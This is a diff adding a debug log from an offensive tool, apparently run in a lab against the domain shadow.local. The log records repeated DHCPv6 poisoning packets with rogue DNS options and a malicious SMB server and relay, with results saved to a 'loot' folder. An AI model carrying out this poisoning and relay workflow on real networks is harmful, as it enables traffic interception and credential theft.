+2021-12-29 14:30:03.562 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:30:03.563 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 14:30:04.546 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:30:04.547 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:30:05.541 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:30:05.542 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:30:07.557 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:30:07.557 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:30:11.585 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:30:11.586 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:30:11.586 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 14:30:17.268 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 14:30:50.397 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 14:30:50.398 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 14:30:50.401 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 14:30:50.407 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:155 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-29 14:30:50.407 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 14:30:50.411 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 14:30:50.412 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 14:30:50.413 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 14:31:15.855 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-29 14:31:15.856 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:31:15.857 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 14:31:16.862 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-29 14:31:16.863 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:31:17.473 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-29 14:31:17.474 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:31:18.487 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-29 14:31:18.488 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:31:19.500 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-29 14:31:19.501 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:31:21.510 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-29 14:31:21.510 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:31:21.511 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 14:31:25.526 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-29 14:31:25.526 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:31:33.590 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-29 14:31:33.590 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:31:33.590 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 14:31:49.606 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-29 14:31:49.606 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:31:49.607 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 14:31:52.700 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:16:20.113 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:16:20.124 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:16:20.147 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:16:20.163 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:156 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:16:20.164 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:16:20.191 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:16:20.193 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:16:20.194 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:16:37.306 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-30 15:16:37.308 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:16:37.308 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:16:38.283 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-30 15:16:38.283 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:16:40.014 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-30 15:16:40.015 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:16:41.049 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-30 15:16:41.049 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:16:41.049 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:16:42.063 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-30 15:16:42.063 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:16:43.342 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:23:01.891 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:23:01.894 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:23:01.902 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:23:01.915 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:156 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:23:01.918 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:23:01.925 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:23:01.926 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:23:01.927 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:23:19.758 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - Packet crafted: 
+2021-12-30 15:23:19.759 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:23:19.759 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:23:32.794 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:29:59.020 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:29:59.023 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:29:59.032 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:29:59.050 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:160 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:29:59.054 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:29:59.069 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:29:59.071 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:29:59.072 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:30:16.203 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - Packet crafted: 
+2021-12-30 15:30:16.203 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:113 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:30:16.203 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:116 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:30:20.970 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:31:59.820 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:31:59.823 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:31:59.831 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:31:59.847 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:154 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:31:59.849 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:31:59.856 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:31:59.861 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:31:59.866 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:32:15.671 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:15.672 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:15.672 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:32:16.659 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:16.659 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:17.407 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:17.407 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:18.459 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:18.459 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:20.461 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:20.461 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:20.461 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:32:20.498 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:20.498 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:21.476 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:21.477 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:23.492 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:23.493 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:27.494 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:27.494 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:35.507 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:32:35.508 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:32:35.508 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:115 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:33:29.962 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:34:20.098 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:34:20.098 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:34:20.101 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:34:20.105 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:154 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:34:20.105 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:34:20.109 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:34:20.110 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:34:20.111 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:34:46.994 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:35:46.218 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:35:46.221 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:35:46.229 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:35:46.244 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:153 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:35:46.246 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:35:46.255 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:35:46.257 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:35:46.269 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:36:03.060 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:36:03.060 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:36:03.061 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:36:04.061 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:36:04.061 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:36:04.770 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:36:04.771 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:36:05.913 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
